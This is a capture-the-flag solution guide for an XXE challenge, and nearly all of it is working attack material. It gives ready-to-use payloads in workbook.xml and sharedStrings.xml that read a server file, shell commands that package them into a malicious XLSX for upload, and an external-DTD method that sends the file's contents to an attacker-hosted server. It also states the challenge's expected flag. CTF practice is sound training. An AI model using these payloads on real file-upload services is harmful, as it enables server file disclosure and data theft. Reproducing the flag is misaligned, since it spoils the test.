# XXE CTF Solution Guide

## 🎯 How to Solve the XXE Challenge

### Method 1: Direct File Reading (Simplest)

**Step 1: Create a malicious workbook.xml**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
<!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
  <customData>&xxe;</customData>
</workbook>
```

**Step 2: Create XLSX file structure**
```bash
# Create directory structure
mkdir XXE_PAYLOAD
cd XXE_PAYLOAD
mkdir _rels xl xl/worksheets xl/_rels docProps

# Create basic XLSX structure files
echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>' > '[Content_Types].xml'

echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>' > '_rels/.rels'

echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>' > 'xl/_rels/workbook.xml.rels'

echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Test</t></is></c></row></sheetData></worksheet>' > 'xl/worksheets/sheet1.xml'

# Create malicious workbook.xml
cat > 'xl/workbook.xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
<!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
  <customData>&xxe;</customData>
</workbook>
EOF

# Create XLSX file
zip -r xxe_payload.xlsx *
```

### Method 2: External DTD (Advanced)

**Step 1: Host external DTD file**
```bash
# Create xxe.dtd on your server
echo '<!ENTITY % d SYSTEM "file:///var/www/html/flag.txt">
<!ENTITY % c "<!ENTITY rrr SYSTEM '\''http://YOUR_SERVER:8000/%d;'\''>">' > xxe.dtd

# Host it on port 8000
python3 -m http.server 8000
```

**Step 2: Create malicious workbook.xml**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
<!ENTITY % asd SYSTEM "http://YOUR_SERVER:8000/xxe.dtd">
%asd;%c;
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
  <customData>&rrr;</customData>
</workbook>
```

### Method 3: Using sharedStrings.xml

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE sst [
<!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
  <si><t>&xxe;</t></si>
</sst>
```

## 🚀 Quick Solution Commands

```bash
# Download and extract a sample XLSX
wget https://sample-files.com/zip/10/xlsx/SampleXLSXFile_6000kb.xlsx
7z x SampleXLSXFile_6000kb.xlsx -oXXE

# Replace workbook.xml with payload
cd XXE
cat > xl/workbook.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [<!ENTITY xxe SYSTEM "file:///var/www/html/flag.txt">]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
<customData>&xxe;</customData>
</workbook>
EOF

# Rebuild XLSX
zip -r ../xxe_solution.xlsx *
cd ..

# Upload xxe_solution.xlsx to the CTF website
```

## 🎯 Expected Flag
`flag{xxe_in_xlsx_files_is_dangerous_2024}`

The flag should appear in the processed output when you upload the malicious XLSX file!
